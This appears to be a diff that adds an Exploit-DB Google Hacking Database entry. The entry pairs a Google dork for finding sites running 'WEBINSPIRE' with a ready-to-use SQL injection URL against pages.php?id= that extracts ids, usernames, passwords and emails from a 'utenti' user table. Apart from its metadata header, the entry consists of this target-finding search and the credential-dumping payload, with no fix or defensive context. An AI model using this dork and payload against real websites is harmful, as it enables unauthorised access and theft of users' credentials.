@@ -1,0 +1,9 @@
+GHDB URL:         https://www.exploit-db.com/ghdb/3648
+Category:         Advisories and Vulnerabilities
+Published Date:   2010-12-14
+Author:           anonymous
+GoogleDork:       "POWERED BY: WEBINSPIRE"
+Description:      "POWERED BY: WEBINSPIRE"
+
+
+Author: ghost-dz SQL Injection: http://server/pages.php?id=30+and+1=0+union+select+1,concat(id,0x3a,usr,0x3a,pwd,0x3a,email),3,4,5,6+from+utenti--
